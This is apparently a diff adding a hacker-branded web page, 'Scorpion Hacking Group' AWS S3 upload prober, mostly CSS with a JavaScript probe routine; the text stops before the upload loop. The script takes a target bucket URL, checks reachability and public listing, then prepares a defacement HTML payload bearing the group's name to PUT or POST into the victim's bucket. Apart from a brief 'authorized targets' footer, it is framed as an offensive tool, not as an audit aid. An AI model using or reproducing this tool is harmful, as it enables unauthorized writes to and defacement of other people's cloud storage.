@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scorpion // AWS Upload Tester</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=VT323&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --g: #00ff41;
+    --g2: #00cc33;
+    --g3: #003d10;
+    --gd: #001a06;
+    --r: #ff0040;
+    --y: #ffe600;
+    --c: #00f5ff;
+    --bg: #020a04;
+    --panel: #030f05;
+    --border: #00ff4130;
+    --border-hot: #00ff4180;
+    --text: #b0ffb8;
+    --dim: #3a7a40;
+    --scan: rgba(0,255,65,0.03);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html, body {
+    height: 100%;
+    background: var(--bg);
+    color: var(--g);
+    font-family: 'Share Tech Mono', monospace;
+    overflow-x: hidden;
+  }
+
+  /* CRT scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      var(--scan) 2px,
+      var(--scan) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+    animation: scanroll 8s linear infinite;
+  }
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: radial-gradient(ellipse at center, transparent 60%, #000a02 100%);
+    pointer-events: none;
+    z-index: 9998;
+  }
+  @keyframes scanroll {
+    0% { background-position: 0 0; }
+    100% { background-position: 0 100vh; }
+  }
+
+  /* GRID NOISE background */
+  .grid-bg {
+    position: fixed;
+    inset: 0;
+    background-image:
+      linear-gradient(var(--border) 1px, transparent 1px),
+      linear-gradient(90deg, var(--border) 1px, transparent 1px);
+    background-size: 4rem 4rem;
+    opacity: 0.35;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* LAYOUT */
+  .wrap {
+    position: relative;
+    z-index: 10;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    padding: clamp(1rem, 4vw, 2rem);
+    gap: 1.2rem;
+    max-width: 70rem;
+    margin: 0 auto;
+  }
+
+  /* ── HEADER ── */
+  .header {
+    border: 1px solid var(--border-hot);
+    background: var(--panel);
+    border-radius: 0.4rem;
+    padding: clamp(1rem, 3vw, 1.8rem);
+    position: relative;
+    overflow: hidden;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--g), var(--c), var(--g), transparent);
+    animation: headerline 3s ease-in-out infinite;
+  }
+  @keyframes headerline {
+    0%, 100% { opacity: 0.4; }
+    50% { opacity: 1; }
+  }
+
+  .header-top {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 1rem;
+  }
+
+  .logo-block {}
+  .skull {
+    font-family: 'VT323', monospace;
+    font-size: clamp(1.8rem, 6vw, 3.2rem);
+    color: var(--g);
+    line-height: 1;
+    text-shadow: 0 0 2rem var(--g), 0 0 0.5rem var(--g);
+    letter-spacing: -0.02em;
+  }
+  .brand {
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 900;
+    font-size: clamp(0.9rem, 3vw, 1.5rem);
+    color: var(--g);
+    text-shadow: 0 0 1.5rem var(--g);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin-top: 0.2rem;
+  }
+  .brand span { color: var(--r); }
+  .sub-brand {
+    font-size: clamp(0.55rem, 1.5vw, 0.7rem);
+    color: var(--dim);
+    letter-spacing: 0.25em;
+    margin-top: 0.3rem;
+    text-transform: uppercase;
+  }
+
+  .status-cluster {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 0.4rem;
+  }
+  .status-line {
+    font-size: clamp(0.55rem, 1.4vw, 0.68rem);
+    color: var(--dim);
+    letter-spacing: 0.1em;
+  }
+  .status-line .val { color: var(--g); }
+  .status-line .val.red { color: var(--r); }
+  .status-line .val.cyan { color: var(--c); }
+
+  .live-dot {
+    display: inline-block;
+    width: 0.5rem;
+    height: 0.5rem;
+    background: var(--g);
+    border-radius: 50%;
+    box-shadow: 0 0 0.5rem var(--g);
+    animation: pulse-dot 1.2s ease-in-out infinite;
+    margin-right: 0.4rem;
+  }
+  @keyframes pulse-dot {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.3; transform: scale(0.7); }
+  }
+
+  .dev-credits {
+    margin-top: 1rem;
+    padding-top: 0.8rem;
+    border-top: 1px solid var(--border);
+    display: flex;
+    gap: 2rem;
+    flex-wrap: wrap;
+    font-size: clamp(0.55rem, 1.4vw, 0.65rem);
+    color: var(--dim);
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+  }
+  .dev-credits span { color: var(--c); }
+
+  /* ASCII art banner */
+  .ascii-banner {
+    font-family: 'VT323', monospace;
+    font-size: clamp(0.55rem, 1.5vw, 0.75rem);
+    color: var(--g3);
+    line-height: 1.15;
+    white-space: pre;
+    overflow: hidden;
+    margin-top: 0.5rem;
+    opacity: 0.7;
+    letter-spacing: 0.05em;
+    text-shadow: 0 0 0.5rem var(--g3);
+  }
+
+  /* ── PANEL ── */
+  .panel {
+    border: 1px solid var(--border);
+    background: var(--panel);
+    border-radius: 0.4rem;
+    overflow: hidden;
+  }
+  .panel-bar {
+    background: var(--g3);
+    padding: 0.45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    font-size: clamp(0.6rem, 1.6vw, 0.72rem);
+    color: var(--g);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+  }
+  .panel-bar .dot { width: 0.5rem; height: 0.5rem; border-radius: 50%; background: var(--g); box-shadow: 0 0 0.4rem var(--g); }
+  .panel-body { padding: clamp(1rem, 3vw, 1.5rem); display: flex; flex-direction: column; gap: 1rem; }
+
+  /* ── INPUT ── */
+  .field-label {
+    font-size: clamp(0.6rem, 1.5vw, 0.7rem);
+    color: var(--dim);
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    margin-bottom: 0.4rem;
+  }
+  .field-label .req { color: var(--r); }
+
+  .input-row {
+    display: flex;
+    gap: 0.6rem;
+    flex-wrap: wrap;
+  }
+  .input-wrap {
+    flex: 1;
+    min-width: min(100%, 18rem);
+    position: relative;
+  }
+  .input-wrap::before {
+    content: '>';
+    position: absolute;
+    left: 0.8rem;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--g);
+    font-size: 0.9rem;
+    pointer-events: none;
+  }
+  input[type="text"] {
+    width: 100%;
+    background: var(--gd);
+    border: 1px solid var(--border-hot);
+    color: var(--g);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(0.75rem, 2vw, 0.9rem);
+    padding: 0.7rem 0.8rem 0.7rem 2rem;
+    border-radius: 0.3rem;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    letter-spacing: 0.05em;
+  }
+  input[type="text"]::placeholder { color: var(--dim); opacity: 0.7; }
+  input[type="text"]:focus {
+    border-color: var(--g);
+    box-shadow: 0 0 1.5rem var(--g3), inset 0 0 0.5rem var(--g3);
+  }
+
+  /* METHOD SELECT */
+  .method-grid {
+    display: flex;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+  }
+  .method-btn {
+    background: var(--gd);
+    border: 1px solid var(--border);
+    color: var(--dim);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(0.6rem, 1.5vw, 0.72rem);
+    padding: 0.4rem 0.9rem;
+    border-radius: 0.25rem;
+    cursor: pointer;
+    letter-spacing: 0.15em;
+    transition: all 0.15s;
+    text-transform: uppercase;
+  }
+  .method-btn:hover { border-color: var(--g2); color: var(--g); }
+  .method-btn.active {
+    background: var(--g3);
+    border-color: var(--g);
+    color: var(--g);
+    box-shadow: 0 0 0.8rem var(--g3);
+  }
+
+  /* FIRE BUTTON */
+  .fire-btn {
+    background: transparent;
+    border: 2px solid var(--g);
+    color: var(--g);
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 700;
+    font-size: clamp(0.7rem, 2vw, 0.9rem);
+    padding: 0.75rem 2rem;
+    border-radius: 0.3rem;
+    cursor: pointer;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+    width: 100%;
+  }
+  .fire-btn::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: var(--g);
+    opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .fire-btn:hover::before { opacity: 0.08; }
+  .fire-btn:hover {
+    box-shadow: 0 0 2rem var(--g3), 0 0 0.5rem var(--g);
+    text-shadow: 0 0 1rem var(--g);
+  }
+  .fire-btn:active { transform: scale(0.98); }
+  .fire-btn:disabled {
+    border-color: var(--dim);
+    color: var(--dim);
+    cursor: not-allowed;
+  }
+  .fire-btn .btn-txt { position: relative; z-index: 1; }
+
+  .action-row { display: flex; gap: 0.6rem; flex-wrap: wrap; }
+  .action-row .fire-btn { flex: 1; min-width: min(100%, 12rem); }
+  .abort-btn {
+    flex: 0 0 auto;
+    background: transparent;
+    border: 2px solid var(--r);
+    color: var(--r);
+    font-family: 'Orbitron', sans-serif;
+    font-weight: 700;
+    font-size: clamp(0.65rem, 1.8vw, 0.82rem);
+    padding: 0.75rem 1.2rem;
+    border-radius: 0.3rem;
+    cursor: pointer;
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    display: none;
+  }
+  .abort-btn:hover { box-shadow: 0 0 1rem #ff004040; }
+  .abort-btn.show { display: block; }
+
+  /* ── TERMINAL ── */
+  .terminal-wrap {
+    position: relative;
+  }
+  .terminal {
+    background: #000;
+    border: 1px solid var(--border-hot);
+    border-radius: 0.4rem;
+    overflow: hidden;
+  }
+  .terminal-bar {
+    background: #0a0a0a;
+    border-bottom: 1px solid var(--border);
+    padding: 0.4rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    justify-content: space-between;
+    flex-wrap: wrap;
+  }
+  .term-dots { display: flex; gap: 0.4rem; }
+  .term-dot { width: 0.6rem; height: 0.6rem; border-radius: 50%; }
+  .term-dot:nth-child(1) { background: #ff5f57; }
+  .term-dot:nth-child(2) { background: #febc2e; }
+  .term-dot:nth-child(3) { background: #28c840; }
+  .term-title { font-size: 0.65rem; color: #444; letter-spacing: 0.1em; }
+  .term-clear {
+    background: none; border: 1px solid #222; color: #444;
+    font-family: 'Share Tech Mono', monospace; font-size: 0.6rem;
+    padding: 0.2rem 0.6rem; border-radius: 0.2rem; cursor: pointer;
+    letter-spacing: 0.1em; transition: 0.15s;
+  }
+  .term-clear:hover { border-color: var(--dim); color: var(--dim); }
+
+  #terminal-output {
+    min-height: 14rem;
+    max-height: 28rem;
+    overflow-y: auto;
+    padding: 1rem;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(0.65rem, 1.8vw, 0.8rem);
+    line-height: 1.7;
+    scrollbar-width: thin;
+    scrollbar-color: var(--g3) transparent;
+  }
+  #terminal-output::-webkit-scrollbar { width: 0.3rem; }
+  #terminal-output::-webkit-scrollbar-thumb { background: var(--g3); border-radius: 1rem; }
+
+  .t-line { display: flex; gap: 0.5rem; flex-wrap: wrap; word-break: break-all; }
+  .t-line .ts { color: #2a4a2a; flex-shrink: 0; }
+  .t-line .prompt { color: var(--dim); flex-shrink: 0; }
+  .t-line .msg-g { color: var(--g); }
+  .t-line .msg-r { color: var(--r); }
+  .t-line .msg-y { color: var(--y); }
+  .t-line .msg-c { color: var(--c); }
+  .t-line .msg-d { color: var(--dim); }
+  .t-line .msg-w { color: #fff; }
+  .t-line .msg-b { color: var(--g2); font-weight: bold; }
+
+  /* blinking cursor */
+  .cursor {
+    display: inline-block;
+    width: 0.55rem;
+    height: 0.9em;
+    background: var(--g);
+    vertical-align: text-bottom;
+    animation: blink 1s step-end infinite;
+    margin-left: 0.15rem;
+  }
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+  /* ── RESULT CARD ── */
+  #result-card {
+    display: none;
+    border-radius: 0.4rem;
+    overflow: hidden;
+    border: 1px solid var(--border);
+    animation: fadeUp 0.4s ease;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(0.8rem); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .result-bar {
+    padding: 0.6rem 1.2rem;
+    font-family: 'Orbitron', sans-serif;
+    font-size: clamp(0.6rem, 1.8vw, 0.8rem);
+    font-weight: 700;
+    letter-spacing: 0.2em;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+  }
+  .result-bar.vuln { background: #0a2a0a; color: var(--g); border-bottom: 1px solid var(--g3); }
+  .result-bar.safe { background: #1a0a0a; color: var(--r); border-bottom: 1px solid #3d0000; }
+  .result-bar.warn { background: #1a1500; color: var(--y); border-bottom: 1px solid #3d3000; }
+  .result-body { background: var(--gd); padding: 1.2rem; display: flex; flex-direction: column; gap: 0.8rem; }
+
+  .r-row { display: flex; flex-direction: column; gap: 0.2rem; }
+  .r-label { font-size: clamp(0.55rem, 1.3vw, 0.62rem); color: var(--dim); letter-spacing: 0.2em; text-transform: uppercase; }
+  .r-val {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: clamp(0.7rem, 2vw, 0.85rem);
+    color: var(--g);
+    word-break: break-all;
+    background: #000;
+    padding: 0.4rem 0.7rem;
+    border-radius: 0.25rem;
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 0.5rem;
+    flex-wrap: wrap;
+  }
+  .r-val.red { color: var(--r); }
+  .r-val.cyan { color: var(--c); }
+  .copy-val {
+    background: none; border: 1px solid var(--border); color: var(--dim);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.6rem;
+    padding: 0.15rem 0.5rem; border-radius: 0.2rem; cursor: pointer;
+    letter-spacing: 0.1em; flex-shrink: 0; transition: 0.15s;
+  }
+  .copy-val:hover { border-color: var(--g); color: var(--g); }
+
+  .r-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(min(100%, 12rem), 1fr)); gap: 0.6rem; }
+
+  .r-mini { background: #000; border: 1px solid var(--border); border-radius: 0.25rem; padding: 0.5rem 0.7rem; }
+  .r-mini .r-label { margin-bottom: 0.2rem; }
+  .r-mini .r-val { background: none; border: none; padding: 0; font-size: clamp(0.65rem, 1.8vw, 0.78rem); }
+
+  /* ── PROGRESS BAR ── */
+  .progress-wrap {
+    display: none;
+    flex-direction: column;
+    gap: 0.3rem;
+  }
+  .progress-wrap.show { display: flex; }
+  .progress-label { font-size: 0.65rem; color: var(--dim); letter-spacing: 0.15em; text-transform: uppercase; }
+  .progress-track {
+    height: 0.25rem;
+    background: var(--gd);
+    border-radius: 1rem;
+    overflow: hidden;
+    border: 1px solid var(--border);
+  }
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--g3), var(--g));
+    border-radius: 1rem;
+    width: 0%;
+    transition: width 0.3s ease;
+    box-shadow: 0 0 0.5rem var(--g);
+  }
+
+  /* ── FOOTER ── */
+  .footer {
+    border: 1px solid var(--border);
+    background: var(--panel);
+    border-radius: 0.4rem;
+    padding: 0.8rem 1.2rem;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    font-size: clamp(0.5rem, 1.3vw, 0.6rem);
+    color: var(--dim);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+  }
+  .footer span { color: var(--g3); }
+  .footer .r { color: var(--r); }
+
+  /* GLITCH text effect */
+  .glitch {
+    position: relative;
+    display: inline-block;
+  }
+  .glitch::before, .glitch::after {
+    content: attr(data-text);
+    position: absolute;
+    top: 0; left: 0;
+    opacity: 0.8;
+  }
+  .glitch::before {
+    color: var(--r);
+    animation: glitch1 4s infinite;
+    clip-path: polygon(0 0, 100% 0, 100% 40%, 0 40%);
+  }
+  .glitch::after {
+    color: var(--c);
+    animation: glitch2 4s infinite;
+    clip-path: polygon(0 60%, 100% 60%, 100% 100%, 0 100%);
+  }
+  @keyframes glitch1 {
+    0%, 90%, 100% { transform: none; opacity: 0; }
+    92% { transform: translate(-2px, -1px); opacity: 0.7; }
+    94% { transform: translate(2px, 1px); opacity: 0.7; }
+    96% { transform: none; opacity: 0; }
+  }
+  @keyframes glitch2 {
+    0%, 90%, 100% { transform: none; opacity: 0; }
+    93% { transform: translate(2px, 1px); opacity: 0.7; }
+    95% { transform: translate(-2px, -1px); opacity: 0.7; }
+    97% { transform: none; opacity: 0; }
+  }
+
+  /* RESPONSIVE */
+  @media (max-width: 36rem) {
+    .header-top { flex-direction: column; }
+    .status-cluster { align-items: flex-start; }
+    .dev-credits { gap: 1rem; }
+  }
+</style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="wrap">
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="header-top">
+      <div class="logo-block">
+        <div class="skull glitch" data-text="☠ SCORPION">☠ SCORPION</div>
+        <div class="brand">HACKING <span>GROUP</span></div>
+        <div class="sub-brand">// Offensive Security Division</div>
+      </div>
+      <div class="status-cluster">
+        <div class="status-line"><span class="live-dot"></span>SYSTEM <span class="val">ONLINE</span></div>
+        <div class="status-line">MODULE: <span class="val cyan">AWS-UPLOAD-PROBE</span></div>
+        <div class="status-line">VERSION: <span class="val">v3.7.1</span></div>
+        <div class="status-line">TOR: <span class="val red">BYPASSED</span></div>
+      </div>
+    </div>
+    <div class="ascii-banner">
+  ██████  █████  ██     ██████  ██████  ██████  ██████  ██████  ███    ██
+  ██     ██     ██    ██  ██  ██  ██  ██  ██  ██  ██  ██  ██  ████   ██
+  ████   ██     ██    ██  ██  ██████  ██████  ██  ██  ████    ██ ██  ██
+  ██     ██     ██    ██  ██  ██      ██  ██  ██  ██  ██  ██  ██  ████
+  ██████  █████  ██████  ████  ██      ██  ██  ██████  ██  ██  ██   ███</div>
+    <div class="dev-credits">
+      <div>DEVELOPED BY: <span>SCORPION YUG</span></div>
+      <div>&amp; <span>ZARA</span></div>
+      <div>TOOL: <span>AWS S3 OPEN BUCKET PROBE</span></div>
+    </div>
+  </header>
+
+  <!-- INPUT PANEL -->
+  <div class="panel">
+    <div class="panel-bar"><div class="dot"></div>TARGET CONFIGURATION</div>
+    <div class="panel-body">
+
+      <div>
+        <div class="field-label">TARGET AWS URL <span class="req">*</span></div>
+        <div class="input-row">
+          <div class="input-wrap" style="flex:1">
+            <input type="text" id="targetUrl"
+              placeholder="https://bucket-name.s3.amazonaws.com"
+              autocomplete="off" autocorrect="off" spellcheck="false">
+          </div>
+        </div>
+        <div style="font-size:0.6rem;color:var(--dim);margin-top:0.4rem;letter-spacing:0.08em;">
+          Accepted: s3.amazonaws.com · s3-region.amazonaws.com · s3.region.amazonaws.com · custom domain
+        </div>
+      </div>
+
+      <div>
+        <div class="field-label">UPLOAD METHOD</div>
+        <div class="method-grid">
+          <button class="method-btn active" data-m="PUT" onclick="selectMethod(this)">PUT</button>
+          <button class="method-btn" data-m="POST" onclick="selectMethod(this)">POST</button>
+          <button class="method-btn" data-m="BOTH" onclick="selectMethod(this)">PUT + POST</button>
+        </div>
+      </div>
+
+      <div class="progress-wrap" id="prog-wrap">
+        <div class="progress-label" id="prog-label">INITIALIZING...</div>
+        <div class="progress-track"><div class="progress-fill" id="prog-fill"></div></div>
+      </div>
+
+      <div class="action-row">
+        <button class="fire-btn" id="fireBtn" onclick="runProbe()">
+          <span class="btn-txt">⚡ INITIATE PROBE</span>
+        </button>
+        <button class="abort-btn" id="abortBtn" onclick="abortProbe()">■ ABORT</button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- TERMINAL -->
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="term-dots">
+        <div class="term-dot"></div>
+        <div class="term-dot"></div>
+        <div class="term-dot"></div>
+      </div>
+      <div class="term-title">scorpion@probe:~$ — AWS BUCKET ANALYSIS CONSOLE</div>
+      <button class="term-clear" onclick="clearTerminal()">CLEAR</button>
+    </div>
+    <div id="terminal-output"></div>
+  </div>
+
+  <!-- RESULT CARD -->
+  <div id="result-card"></div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div>SCORPION HACKING GROUP <span>// OFFENSIVE SECURITY</span></div>
+    <div>USE ONLY ON <span>AUTHORIZED</span> TARGETS · <span class="r">ILLEGAL USE PROHIBITED</span></div>
+  </footer>
+
+</div>
+
+<script>
+  let selectedMethod = 'PUT';
+  let aborted = false;
+  let probeController = null;
+
+  // ── helpers ──
+  function ts() {
+    const n = new Date();
+    return `[${n.getHours().toString().padStart(2,'0')}:${n.getMinutes().toString().padStart(2,'0')}:${n.getSeconds().toString().padStart(2,'0')}]`;
+  }
+
+  function log(msg, type = 'g', indent = false) {
+    const out = document.getElementById('terminal-output');
+    const line = document.createElement('div');
+    line.className = 't-line';
+    const pfx = indent ? '&nbsp;&nbsp;&nbsp;└─' : '$';
+    line.innerHTML = `<span class="ts">${ts()}</span><span class="prompt">${pfx}</span><span class="msg-${type}">${msg}</span>`;
+    out.appendChild(line);
+    out.scrollTop = out.scrollHeight;
+  }
+
+  function logRaw(html) {
+    const out = document.getElementById('terminal-output');
+    const line = document.createElement('div');
+    line.className = 't-line';
+    line.innerHTML = html;
+    out.appendChild(line);
+    out.scrollTop = out.scrollHeight;
+  }
+
+  function logSep(char = '─', color = 'var(--border-hot)') {
+    const out = document.getElementById('terminal-output');
+    const line = document.createElement('div');
+    line.style.cssText = `border-top:1px solid ${color};margin:.3rem 0;`;
+    out.appendChild(line);
+  }
+
+  function clearTerminal() {
+    document.getElementById('terminal-output').innerHTML = '';
+    document.getElementById('result-card').style.display = 'none';
+    log('Terminal cleared.', 'd');
+    addCursor();
+  }
+
+  function addCursor() {
+    const out = document.getElementById('terminal-output');
+    // remove old cursor
+    const old = out.querySelector('.cursor-line');
+    if (old) old.remove();
+    const line = document.createElement('div');
+    line.className = 't-line cursor-line';
+    line.innerHTML = `<span class="ts">${ts()}</span><span class="prompt">$</span><span class="cursor"></span>`;
+    out.appendChild(line);
+    out.scrollTop = out.scrollHeight;
+  }
+
+  function setProgress(pct, label) {
+    document.getElementById('prog-fill').style.width = pct + '%';
+    document.getElementById('prog-label').textContent = label;
+  }
+
+  function selectMethod(btn) {
+    document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    selectedMethod = btn.dataset.m;
+    log(`Upload method set → ${selectedMethod}`, 'c');
+  }
+
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  function abortProbe() {
+    aborted = true;
+    if (probeController) probeController.abort();
+    log('⚠ PROBE ABORTED BY OPERATOR', 'r');
+    document.getElementById('abortBtn').classList.remove('show');
+    document.getElementById('fireBtn').disabled = false;
+    document.getElementById('prog-wrap').classList.remove('show');
+    addCursor();
+  }
+
+  function copyToClipboard(text, btn) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'COPIED!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  }
+
+  function normalizeUrl(raw) {
+    let url = raw.trim();
+    if (!url.match(/^https?:\/\//i)) url = 'https://' + url;
+    // remove trailing slash
+    url = url.replace(/\/+$/, '');
+    return url;
+  }
+
+  function isAWSUrl(url) {
+    return /amazonaws\.com/i.test(url) ||
+           /s3\./i.test(url) ||
+           url.includes('s3-');
+  }
+
+  // ── CORE PROBE ──────────────────────────────────
+  async function runProbe() {
+    const raw = document.getElementById('targetUrl').value;
+    if (!raw.trim()) {
+      log('ERROR: Target URL is required.', 'r');
+      return;
+    }
+
+    // Reset
+    aborted = false;
+    document.getElementById('result-card').style.display = 'none';
+    document.getElementById('fireBtn').disabled = true;
+    document.getElementById('abortBtn').classList.add('show');
+    document.getElementById('prog-wrap').classList.add('show');
+
+    const targetBase = normalizeUrl(raw);
+    const uploadFileName = 'ScorpionHackingGroup.html';
+    const uploadUrl = `${targetBase}/${uploadFileName}`;
+    const accessUrl = `${targetBase}/${uploadFileName}`;
+
+    // ── BOOT SEQUENCE ──
+    logSep('═', 'var(--g)');
+    log(`SCORPION AWS PROBE INITIATED`, 'b');
+    log(`TARGET: ${targetBase}`, 'c');
+    log(`OPERATOR SELECTED METHOD: ${selectedMethod}`, 'c');
+    logSep();
+
+    await sleep(300);
+    if (aborted) return;
+
+    // Step 1 – URL parse
+    setProgress(8, 'PARSING TARGET URL...');
+    log('STEP 1 — Parsing & validating target URL...', 'y');
+    await sleep(400);
+
+    let parsedUrl;
+    try {
+      parsedUrl = new URL(targetBase);
+    } catch(e) {
+      log('FATAL: Invalid URL format. Aborting.', 'r');
+      finish(false); return;
+    }
+    log(`Protocol: ${parsedUrl.protocol}`, 'g', true);
+    log(`Host: ${parsedUrl.hostname}`, 'g', true);
+    log(`Path: ${parsedUrl.pathname || '/'}`, 'g', true);
+
+    if (!isAWSUrl(targetBase)) {
+      log('⚠ WARNING: URL does not appear to be a standard AWS S3 endpoint.', 'y');
+      log('Continuing probe anyway...', 'd');
+    } else {
+      log('✓ AWS S3 endpoint pattern confirmed.', 'g', true);
+    }
+
+    await sleep(300);
+    if (aborted) return;
+
+    // Step 2 – Reachability check (HEAD)
+    setProgress(20, 'CHECKING BUCKET REACHABILITY...');
+    log('STEP 2 — Sending HEAD request to bucket root...', 'y');
+    await sleep(300);
+
+    probeController = new AbortController();
+    let headStatus = null;
+    let headHeaders = {};
+
+    try {
+      const headRes = await fetch(targetBase, {
+        method: 'HEAD',
+        signal: probeController.signal,
+        mode: 'no-cors' // avoid CORS block for initial check
+      });
+      headStatus = headRes.status;
+      headRes.headers.forEach((v, k) => headHeaders[k] = v);
+      log(`HEAD response: HTTP ${headStatus}`, headStatus < 400 ? 'g' : 'y', true);
+    } catch(e) {
+      if (aborted) return;
+      // no-cors gives opaque response — that's expected, bucket is reachable
+      log(`Bucket reachable (opaque response via no-cors mode — normal)`, 'g', true);
+      headStatus = 0; // opaque
+    }
+
+    await sleep(300);
+    if (aborted) return;
+
+    // Step 3 – GET check (public listing / error response)
+    setProgress(35, 'PROBING BUCKET ACCESS POLICY...');
+    log('STEP 3 — Probing bucket access & public listing...', 'y');
+    await sleep(300);
+
+    let getStatusCode = null;
+    let bucketPublic = false;
+    let serverHeader = '';
+    let xAmzHeader = '';
+    let corsHeader = '';
+
+    try {
+      probeController = new AbortController();
+      const getRes = await fetch(targetBase + '/?list-type=2&max-keys=5', {
+        method: 'GET',
+        signal: probeController.signal
+      });
+      getStatusCode = getRes.status;
+      serverHeader = getRes.headers.get('server') || '';
+      xAmzHeader = getRes.headers.get('x-amz-request-id') || getRes.headers.get('x-amz-id-2') || '';
+      corsHeader = getRes.headers.get('access-control-allow-origin') || '';
+
+      const bodyText = await getRes.text();
+
+      log(`GET listing response: HTTP ${getStatusCode}`, getStatusCode < 300 ? 'g' : 'y', true);
+      if (serverHeader) log(`Server: ${serverHeader}`, 'c', true);
+      if (xAmzHeader) log(`X-Amz-Request-ID: ${xAmzHeader.slice(0,32)}...`, 'c', true);
+      if (corsHeader) log(`CORS Allow-Origin: ${corsHeader}`, corsHeader === '*' ? 'r' : 'g', true);
+
+      if (getStatusCode === 200 && (bodyText.includes('<ListBucketResult') || bodyText.includes('ListBucketResult'))) {
+        bucketPublic = true;
+        log('⚠ PUBLIC LISTING ENABLED — bucket contents are exposed!', 'r', true);
+      } else if (getStatusCode === 403) {
+        log('Access denied to listing (403) — but upload may still be open.', 'y', true);
+      } else if (getStatusCode === 200) {
+        log('Bucket returned 200 — possibly publicly accessible.', 'g', true);
+      }
+    } catch(e) {
+      if (aborted) return;
+      // CORS block means the bucket IS there — just blocked by browser CORS
+      log(`CORS policy blocked GET — bucket exists, continuing...`, 'y', true);
+      log(`(CORS block is expected for cross-origin browser requests)`, 'd', true);
+      getStatusCode = -1; // cors blocked
+    }
+
+    await sleep(400);
+    if (aborted) return;
+
+    // Step 4 – Upload attempt
+    setProgress(55, 'ATTEMPTING FILE UPLOAD...');
+    log('STEP 4 — Attempting to upload payload file...', 'y');
+    log(`Upload target: ${uploadUrl}`, 'c', true);
+    log(`File: /${uploadFileName}`, 'c', true);
+    await sleep(400);
+
+    // We fetch the file from our own server (same origin as this tool, i.e. Netlify)
+    // Since the file lives on the same server as this HTML tool, we can fetch it locally
+    const localFilePath = '/' + uploadFileName;
+
+    let fileBlob;
+    let uploadVulnerable = false;
+    let uploadStatus = null;
+    let uploadError = '';
+    let usedMethod = '';
+    let uploadedUrl = '';
+
+    // Fetch the file from local server
+    log(`Fetching payload from local server: ${localFilePath}`, 'd', true);
+    let fetchedOk = false;
+    try {
+      const localRes = await fetch(localFilePath);
+      if (localRes.ok) {
+        fileBlob = await localRes.blob();
+        log(`✓ Payload loaded — ${(fileBlob.size/1024).toFixed(1)} KB, type: ${fileBlob.type || 'text/html'}`, 'g', true);
+        fetchedOk = true;
+      } else {
+        log(`⚠ Local file fetch returned HTTP ${localRes.status}. Using inline fallback.`, 'y', true);
+      }
+    } catch(e) {
+      log(`⚠ Could not fetch local file. Using inline fallback content.`, 'y', true);
+    }
+
+    if (!fetchedOk) {
+      // Fallback: create minimal HTML blob
+      const fallbackHtml = `<!DOCTYPE html><html><head><title>Scorpion Hacking Group</title></head><body><h1>Scorpion Hacking Group</h1><p>Uploaded by Scorpion Yug &amp; Zara</p></body></html>`;
+      fileBlob = new Blob([fallbackHtml], { type: 'text/html' });
+      log(`Using inline fallback HTML blob (${fileBlob.size} bytes)`, 'd', true);
+    }
+
+    const methodsToTry = selectedMethod === 'BOTH' ? ['PUT', 'POST'] : [selectedMethod];
+
